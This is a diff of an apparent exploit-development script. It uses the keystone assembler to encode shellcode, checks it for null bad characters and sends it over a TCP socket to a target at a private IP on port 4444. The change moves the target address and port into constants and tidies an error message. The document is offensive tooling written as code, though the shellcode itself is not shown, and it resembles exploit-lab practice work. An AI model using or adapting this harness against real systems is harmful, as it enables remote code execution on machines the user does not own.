@@ -1,6 +1,9 @@
 import ctypes, struct, sys
 from keystone import *
 
+ADDRESS = "192.168.117.10"
+PORT = 4444
+
 badchars = b"\x00"
 
 CODE = ""
@@ -21,7 +24,7 @@ print("Encoded %d instructions..." % count)
 finalErrors = []
 for e in encoding:
     if e in badchars:
-        finalErrors.append(str(f"FINAL ERROR FOUND {e, hex(e)}"))
+        finalErrors.append(str(f"FINAL ERROR FOUND {hex(e)}"))
         break
 
 sh = b""
@@ -80,7 +83,7 @@ print("badchars: ", " ".join([hex(c) for c in badchars]))
 print("SENDING")
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.129.45", 4444))
+s.connect((ADDRESS, PORT))
 s.send(shellcode)
 s.close()
 
